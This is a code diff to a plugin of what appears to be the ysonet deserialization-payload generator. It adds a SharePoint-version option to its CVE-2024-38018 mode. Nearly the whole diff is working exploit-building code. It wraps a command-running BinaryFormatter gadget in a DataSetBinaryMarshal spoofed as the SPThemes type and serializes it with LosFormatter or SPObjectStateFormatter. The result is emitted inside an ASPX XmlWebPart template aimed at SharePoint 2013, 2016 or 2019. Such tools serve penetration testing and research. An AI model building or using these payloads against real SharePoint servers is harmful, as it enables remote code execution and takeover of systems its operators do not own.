@@ -7,6 +7,7 @@ using System.IO;
 using System.IO.Compression;
 using System.Reflection;
 using System.Text;
+using System.Web.UI;
 using System.Xml;
 using ysonet.Generators;
 using ysonet.Helpers;
@@ -43,6 +44,7 @@ namespace ysonet.Plugins
         static bool noComment = false; // suppress the explanatory HTML comment; output only the payload/form body
         static int variant = 1; // Add variant support for CVE-2025-49704
         static bool dosAcknowledged = false; // --i-understand-dos, for the user-selected gadget CVEs
+        static string spver = "2019"; // CVE-2024-38018: which SharePoint generation the webpart targets
 
         static OptionSet options = new OptionSet()
             {
@@ -57,6 +59,7 @@ namespace ysonet.Plugins
                 {"rawcmd", "Command will be executed as is without `cmd /c ` being appended (anything after the first space is an argument).", v => rawcmd = v != null },
                 {"no-comment", "Output only the serialized payload or form body, without the trailing explanatory HTML comment.", v => noComment = v != null },
                 {"var|variant=", "Variant number for CVE-2025-49704 only. Choices: 1 (default, uses DataSetOldBehaviourGenerator variant 2), 2 (uses DataSetOldBehaviourFromFileGenerator variant 2)", v => int.TryParse(v, out variant) },
+                {"spver=", "CVE-2024-38018 only: which SharePoint generation to target. Choices: 2019 (default), 2016, 2013. 2016 and 2019 share the same assembly identity and produce the same payload; 2013 uses LosFormatter and the 15.0.0.0 assembly reference.", v => spver = v },
                 {Helpers.Core.DosPolicy.AckOptionName, Helpers.Core.DosPolicy.AckHelp, v => dosAcknowledged = v != null },
             };
 
@@ -107,8 +110,8 @@ namespace ysonet.Plugins
                 },
                 new PluginMode {
                     Name = "CVE-2024-38018",
-                    Description = "SPObjectStateFormatter webpart; choose a BinaryFormatter gadget.",
-                    Options = new string[] { "command", "gadget" },
+                    Description = "SPObjectStateFormatter webpart; choose a BinaryFormatter gadget and the SharePoint generation.",
+                    Options = new string[] { "command", "gadget", "spver" },
                     Required = new string[] { "command" },
                     Preset = new Dictionary<string, string> { { "cve", "CVE-2024-38018" } },
                 },
@@ -156,6 +159,10 @@ namespace ysonet.Plugins
             useSimpleType = true;
             rawcmd = false;
             noComment = false;
+            // Optional with a default, so without this reset a value from an earlier
+            // in-process run silently decides which SharePoint generation a later
+            // payload targets. Interactive mode makes many calls in one process.
+            spver = "2019";
 
             List<string> extra;
             try
@@ -305,74 +312,128 @@ namespace ysonet.Plugins
                 throw new Exception("BinaryFormatter not supported by the selected gadget.");
             }
 
+            // Which SharePoint generation the webpart is aimed at. The two shapes differ in
+            // exactly two places: the formatter that wraps the marshal, and the assembly
+            // version the SPThemes reference carries.
+            //
+            //   2019 / 2016 - Microsoft.SharePoint.WebPartPages.SPObjectStateFormatter, and
+            //                 an ApplicationPages reference at 16.0.0.0. Both generations
+            //                 share that identity, so one payload serves them both. This is
+            //                 the only path that needs the shipped SharePoint assemblies.
+            //   2013        - System.Web.UI.LosFormatter, and a 15.0.0.0 reference. SP2013
+            //                 never had SPObjectStateFormatter on this path. Nothing is
+            //                 loaded from disk: the type reference is written by name, the
+            //                 same way DataSetTypeSpoofGenerator writes one, so targeting
+            //                 SP2013 needs no SharePoint 2013 assembly to be shipped.
+            string spGeneration = (spver ?? "").Trim();
+            if (spGeneration.Length == 0) { spGeneration = "2019"; }
+            if (spGeneration != "2013" && spGeneration != "2016" && spGeneration != "2019")
+            {
+                string bad = "Unsupported --spver '" + spver + "'. Choices: 2019 (default), 2016, 2013.";
+                Console.WriteLine(bad);
+                throw new Exception(bad);
+            }
+            bool isSp2013 = spGeneration == "2013";
+
+            // The <%@ Register %> directive has to name the same generation as the payload
+            // it wraps. It used to be pinned at 15.0.0.0 while the blob carried a 16.x
+            // reference, which is the SP2013 value left behind on the SP2019 shape.
+            string spAssemblyVersion = isSp2013 ? "15.0.0.0" : "16.0.0.0";
+
             // Base paths
             string baseDir = AppDomain.CurrentDomain.BaseDirectory;
             string dllsFolder = Path.Combine(baseDir, "dlls/sharepoint/19/");
 
 
-            // register a quick assembly‐resolver so LoadFrom() will pick up any *other* DLL
-            AppDomain.CurrentDomain.AssemblyResolve += (sender, args) =>
-            {
-                // look for the requested DLL by name in our dllsFolder
-                string simpleName = new AssemblyName(args.Name).Name + ".dll";
-                string candidate = Path.Combine(dllsFolder, simpleName);
-                return File.Exists(candidate)
-                    ? Assembly.LoadFrom(candidate)
-                    : null;
-            };
-
-
-            // --- Load Microsoft.SharePoint.dll ---
-            string spPath = Path.Combine(dllsFolder, "Microsoft.SharePoint.dll");
-            if (!File.Exists(spPath))
-                throw new FileNotFoundException("Microsoft.SharePoint.dll not found", spPath);
-            Assembly spAsm = Assembly.LoadFrom(spPath);
-
-            // --- Load Microsoft.SharePoint.ApplicationPages.dll ---
-            string appPagesPath = Path.Combine(dllsFolder, "Microsoft.SharePoint.ApplicationPages.dll");
-            if (!File.Exists(appPagesPath))
-                throw new FileNotFoundException("Microsoft.SharePoint.ApplicationPages.dll not found", appPagesPath);
-            Assembly appPagesAsm = Assembly.LoadFrom(appPagesPath);
-
-            // --- Get the formatter type from Microsoft.SharePoint.dll ---
-            Type fmtType = spAsm.GetType(
-                "Microsoft.SharePoint.WebPartPages.SPObjectStateFormatter",
-                throwOnError: true,
-                ignoreCase: false);
-
-
-            // --- Create SPObjectStateFormatter instance ---
-            // This is for SharePoint 2019
-            // SharePoint 2013 just uses LosFormatter which can be replaced manually in the final payload!
-            object spformatter = Activator.CreateInstance(fmtType);
-
-            // --- Find its public Serialize(ArrayList) method ---
-            MethodInfo miSerialize = fmtType.GetMethod(
-                "Serialize",
-                BindingFlags.Instance | BindingFlags.Public,
-                binder: null,
-                types: new[] { typeof(Object) },
-                modifiers: null);
-            if (miSerialize == null)
-                throw new MissingMethodException(fmtType.FullName, "Serialize");
-
-            //*
-            // --- Get the SPThemes type from Microsoft.SharePoint.ApplicationPages.dll ---
-            Type spThemesType = appPagesAsm.GetType(
-                "Microsoft.SharePoint.ApplicationPages.SPThemes",
-                throwOnError: true,
-                ignoreCase: false);
-
-
-            // --- Build your payload: DataSetBinaryMarshal wrapping your binaryformatter data and SPThemes type ---
+            // The marshal is the same object on both paths. Only the type it claims to be,
+            // and the formatter that writes it, change with the target generation.
             var payloadDataSetMarshal = new DataSetBinaryMarshal(binaryformatterPayload);
-            payloadDataSetMarshal.SetDerivedType(spThemesType);
+            string serializedPayload;
 
-            var list = new ArrayList { payloadDataSetMarshal };
+            if (isSp2013)
+            {
+                // SP2013 path. Nothing is loaded from disk: the SPThemes reference is
+                // written by name at 15.0.0.0, which is all the wire format carries, and
+                // LosFormatter comes from System.Web. That is what makes targeting SP2013
+                // possible without shipping a SharePoint 2013 assembly.
+                payloadDataSetMarshal.SetDerivedTypeName(
+                    "Microsoft.SharePoint.ApplicationPages.SPThemes",
+                    "Microsoft.SharePoint.ApplicationPages, Version=15.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c");
 
-            string serializedPayload = (string)miSerialize.Invoke(spformatter, new object[] { payloadDataSetMarshal });
+                // No MAC key is set, so this is the unsigned LosFormatter form the webpart
+                // property is read with, matching the SPObjectStateFormatter output shape.
+                LosFormatter losFormatter = new LosFormatter();
+                using (StringWriter writer = new StringWriter())
+                {
+                    losFormatter.Serialize(writer, payloadDataSetMarshal);
+                    serializedPayload = writer.ToString();
+                }
+            }
+            else
+            {
+                // register a quick assembly‐resolver so LoadFrom() will pick up any *other* DLL
+                AppDomain.CurrentDomain.AssemblyResolve += (sender, args) =>
+                {
+                    // look for the requested DLL by name in our dllsFolder
+                    string simpleName = new AssemblyName(args.Name).Name + ".dll";
+                    string candidate = Path.Combine(dllsFolder, simpleName);
+                    return File.Exists(candidate)
+                        ? Assembly.LoadFrom(candidate)
+                        : null;
+                };
 
-            string final_payload_template = @"<%@ Register Tagprefix=""WebPartPages"" Namespace="" Microsoft.SharePoint.WebPartPages"" Assembly=""Microsoft.SharePoint, Version=15.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c"" %>
+
+                // --- Load Microsoft.SharePoint.dll ---
+                string spPath = Path.Combine(dllsFolder, "Microsoft.SharePoint.dll");
+                if (!File.Exists(spPath))
+                    throw new FileNotFoundException("Microsoft.SharePoint.dll not found", spPath);
+                Assembly spAsm = Assembly.LoadFrom(spPath);
+
+                // --- Load Microsoft.SharePoint.ApplicationPages.dll ---
+                string appPagesPath = Path.Combine(dllsFolder, "Microsoft.SharePoint.ApplicationPages.dll");
+                if (!File.Exists(appPagesPath))
+                    throw new FileNotFoundException("Microsoft.SharePoint.ApplicationPages.dll not found", appPagesPath);
+                Assembly appPagesAsm = Assembly.LoadFrom(appPagesPath);
+
+                // --- Get the formatter type from Microsoft.SharePoint.dll ---
+                Type fmtType = spAsm.GetType(
+                    "Microsoft.SharePoint.WebPartPages.SPObjectStateFormatter",
+                    throwOnError: true,
+                    ignoreCase: false);
+
+
+                // --- Create SPObjectStateFormatter instance ---
+                // This serves SharePoint 2019 and 2016: both bind the same 16.0.0.0 identity.
+                object spformatter = Activator.CreateInstance(fmtType);
+
+                // --- Find its public Serialize(ArrayList) method ---
+                MethodInfo miSerialize = fmtType.GetMethod(
+                    "Serialize",
+                    BindingFlags.Instance | BindingFlags.Public,
+                    binder: null,
+                    types: new[] { typeof(Object) },
+                    modifiers: null);
+                if (miSerialize == null)
+                    throw new MissingMethodException(fmtType.FullName, "Serialize");
+
+                //*
+                // --- Get the SPThemes type from Microsoft.SharePoint.ApplicationPages.dll ---
+                Type spThemesType = appPagesAsm.GetType(
+                    "Microsoft.SharePoint.ApplicationPages.SPThemes",
+                    throwOnError: true,
+                    ignoreCase: false);
+
+
+                // --- Build your payload: DataSetBinaryMarshal wrapping your binaryformatter data and SPThemes type ---
+                payloadDataSetMarshal.SetDerivedType(spThemesType);
+
+                serializedPayload = (string)miSerialize.Invoke(spformatter, new object[] { payloadDataSetMarshal });
+            }
+
+            // {spAssemblyVersion} follows the selected generation, so the directive and the
+            // blob below it always name the same SharePoint. The shape is otherwise
+            // identical across generations.
+            string final_payload_template = @"<%@ Register Tagprefix=""WebPartPages"" Namespace="" Microsoft.SharePoint.WebPartPages"" Assembly=""Microsoft.SharePoint, Version={spAssemblyVersion}, Culture=neutral, PublicKeyToken=71e9bce111e9429c"" %>
 
 <WebPartPages:XmlWebPart ID=""SPWebPartManager"" runat=""Server"">
     <WebPart
@@ -381,7 +442,9 @@ namespace ysonet.Plugins
     </WebPart>
 </WebPartPages:XmlWebPart>";
 
-            return final_payload_template.Replace("{serializedPayload}", serializedPayload);
+            return final_payload_template
+                .Replace("{spAssemblyVersion}", spAssemblyVersion)
+                .Replace("{serializedPayload}", serializedPayload);
         }
 
         // CVE-2026-50522: pre-auth SharePoint WS-Federation trust endpoint.
